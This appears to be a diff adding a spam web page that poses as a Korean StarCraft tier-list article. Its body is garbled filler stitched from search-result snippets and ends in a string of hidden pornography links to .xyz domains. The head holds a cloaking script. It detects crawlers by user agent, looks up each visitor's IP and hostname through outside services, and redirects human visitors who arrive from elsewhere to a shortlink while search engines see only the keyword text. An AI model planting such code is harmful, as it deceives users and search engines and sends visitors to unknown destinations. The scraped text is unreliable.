@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>14792</title>
+</script>
+</head>
+<body>
+<h1>스타크래프트 티어표</h1>
+<p>Aug 18, 2021 — '스타여캠 0티어' 추가, 추가로 인한 조커티어 ~ 스타여캠 3티어 구간 재배치. - 2.52 변경사항. 티어간 벌어진 간격조정으로 인한 기준점 재설정 및 ...Oct 15, 2022 — 앵게임넷, 티어표, starcraft, 스타 크래프트, tier, 티어. ... 티어표에 대한 자세한 정보는 에펨코리아 스타CK 밸런스 티어표를 참조 하세요.티어표는 스트리머 간의 맞대결을 우선시해서 정리하고 있네요. 마스터 이상 = 2200 이상. 다이아(상) = 2100 언저리. 다이아(하) = 2000 언저리.https://m.fmkorea.com/3784287890 지난 스낳대 결승전 결과가 반영된 티어표가 나왔내요... 형님의 승격을 축하드립니다.스타크래프트 티어표 · 프로게이머 등급 한 방에 정리해드립니다 · 변현제가 생각하는 스타크래프트 래더 점수와 롤 티어 비교 · 김명운의 프로게이머 급 나누기 다들 ...Create a ranking for 스타크래프트 등장인물 전투력 티어표 1.2. 1. Edit the label text in each row. 2. Drag the images into the order you would like. 3. Click ' ...Jul 10, 2021 — 티어조정 반영을 위한 누락, 연습, 비방 전적 제보 부탁드림. - 1.16 수정사항 아기티어 추가, 저티어 배치 조정. - 2.0 수정사항Jan 29, 2022 — 꾸하~! 안녕하세요 꾸석입니다 요즘 스타가 핫 한 게임 반열에 들어서고 있는 중이라 비제이들도 참 많이 하더라구요 그래서 스타를 하는 여캠의 티어 ...Jan 24, 2023 — [게임] 스타 선술집 전투 티어표 ; 노바 · 헤라클레스 ; 집행관 · 코브라 ; 대군주 · 바퀴 ; 제련소 · 토르 ; 아바투르 · 스투코프.Feb 8, 2023 — [게임] startavern님의 티어표를 활용한 글(아몬 협동 고행 난이도 고점기준 티어표) · #스타크래프트2 · #스타2 · #유즈맵 · #스2 · #스타2유즈맵 · #스타 ...아프리카 스타CK 최근 티어표. 키무스 2022-01-18 11:45:26 조회 4,109 UP 0.Apr 26, 2023 — 클로즈베타 테스트(CBT)를 참가한 유저들의 평가를 기반으로 작성된 티어표입니다! 추천도 캐릭터 0티어 브로냐 (5성) 바람/화합 웰트 (5성) 허수/ ...2 hours ago — 소지 캐릭터에 쿨타임이 짧은 버스트Ⅱ 캐릭터가 없는 경우는, 니히리스타를 손에 넣어 두자. 승리의 여신 니케 등급표 01월 21일 기준 [일본섭 버전 2]ss ...아프리카 TV 스타크래프트 BJ이다. 주종은 프로토스이다. 무친대 소속으로 스타CK 밸런스 티어표 상 6티어 프로토스이다. 2. 방송 컨텐츠[ ...Jun 30, 2021 — Subject, [유머] 외국 스트리머의 스타유닛 티어표.. jpg ... 스타게이트에서 나오는 뮤탈은 아무리 생각해도 구립니다. 해처리에서 나오는 스카웃이 ...펌)스트리머 스타크래프트 티어표.jpg. https://theqoo.net/2022629030. 무명의 더쿠 | 06-08 | 조회 수 5407. GpkkU.png. D급은 D,E로 한 번 더 나눠야 되는거 아닌가 ...Jun 10, 2021 — 트위치 스타크래프트 티어표(21.6.10.기준) · 【5/17 게시글 누를 때 뜨는 파일 다운로드 실행하지 말 것】 · 더쿠 이용 규칙 4-16) 핫게중계 , 4-17) ...[일반] 스타크래프트 티어표 최신ver. ㅇㅇ; 2021.07.19 12:57. 갤로그 가기. 조회수 992; 추천 0; 댓글 6. viewimage.php?id=24afdc&amp;no= ...May 25, 2023 — 리세마라 시간은 약 10~20분사이 소요됩니다. 블랙클로버 모바일 리세마라 티어표(SSR기준) ※ 추후 캐릭터 클릭 시 상세 정보 글..20 hours ago — 2022 — 요새 아프리카 티비에서 스타크래프트 대학 대전 열풍이 일고 있습니다. … 티켓 가격 알아보기 스타 CK 밸런스 티어표 2.73 갓 티어 갓 티어 ...스폰빵닷컴은. 스타크래프트 bj 전적기록실입니다. 누락된 bj 전적기록을 원한다면 가입 후 누구나 기록할 수 있습니다. 스타 밸런스티어표를 참고하였으며, ...인기 애니메이션인 페어리테일 라이선스를 정식으로 체결하여 출시된 게임 은 나츠의. 앵게임넷, 티어표, starcraft, 스타 크래프트, tier, 티어. 이전 체리테일 채널에 ...18 hours ago — 표만 보시고 거래했다 손해보면 가슴 아파요ㅠㅠ #올타디거래티어표#올스타거래 . ... 올 여름 다가오는 스타크래프트: 리마스터에는 그래픽 외에도 …스타크래프트 - 에펨코리아. 공지. 타 게시판 언급 부분을 피해주시기 바랍니다. 독고. AF 스타대학 인원현황판_12.22 5153. btrfly. 공지. 스타CK 밸런스 티어표 281 ...21 hours ago — 스타 Elo 스타크래프트 남성전적사이트스타크래프트 여성(혼성)전적 ... 진여T 66.7%.acum 3 zile — 스타 여캠 Elo 티어표(2022 전적 상세검색은 5 ...11 hours ago — 원피스 바운티 러쉬 등급표 티어정리 존재하지 않는 이미지입니다. ... 앵게임넷, 티어표, starcraft, 스타 크래프트, tier, 티어. 티어표에 대한 ...철권7 캐릭터 티어 등급표 (Feat 무릎) 2000년대 PC방과 스타크래프트, 디아블로 등의 활성화로 인해 오락실이 몰락하고 현재는 대형 오락실만 근근히 남아 명맥을 ...철권7 캐릭터 티어 등급표 (Feat 무릎) 2000년대 PC방과 스타크래프트, 디아블로 등의 활성화로 인해 오락실이 몰락하고 현재는 대형 오락실만 근근히 남아 명맥을 ...13 hours ago — 앵게임넷, 티어표, starcraft, 스타 크래프트, tier, 티어. 티어표에 대한 자세한 정보는 에펨코리아 스타CK 밸런스 티어표를 참조 하세요.18 hours ago — 스타크래프트 리마스터 현재 래더 순위.jpg 인스티즈. ... 스타 여캠 Elo 티어표 (2023 Notice · 09 5%, 1217 &lt;스타크래프트&gt;에도 '래더 01 스타, ...재개 코코 인 스타 펨코 코코 인 스타 펨코 스타크래프트 최신 인기글. ... 이 사건으로 유소나는 티어표에 대한 자세한 정보는 에펨코리아 스타ck 밸런스 티어표를 ...10 hours ago — BJ김인호 아프리카티비 1티어 꽃미남 얼굴에 대한 9가지 사실 · BJ김인호 ... 스타,스타크래프트,스타 크래프트,티어표,아프리카,아프리카 tv, ...스타크래프트 - 에펨코리아. 공지. 독고. 공지. AF 스타대학 인원현황판_12.22 5138. btrfly 공지. 스타CK 밸런스 티어표 2.78 (2022.11. (주) 코코 인스타 (이하 ...13 hours ago — 이전에는 스타 안했다가 – 스타크래프트 – 에펨코리아 티어 배그 샷건 배틀 ... 짭배그 무기 티어표인데사실 E만 거르면됨 https://www 크래프톤, ...이전 편 [리뷰] 트위치tv 스타크래프트 카툰 스트리머 배틀. 363 읽음 시리즈 번호 112. 티어표에 대한 자세한 정보는 에펨코리아 스타CK 밸런스 티어표를 참조 하세요 ...스타크래프트,스타 크래프트,티어표,아프리카,아프리카 tv,앵게임넷,앵지 . .노트북을 키기도 귀찮고, 롤드컵을 볼 때 딴짓도 자주 해서 ㅎㅎ TV를 켜서 보는 게 더 좋 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
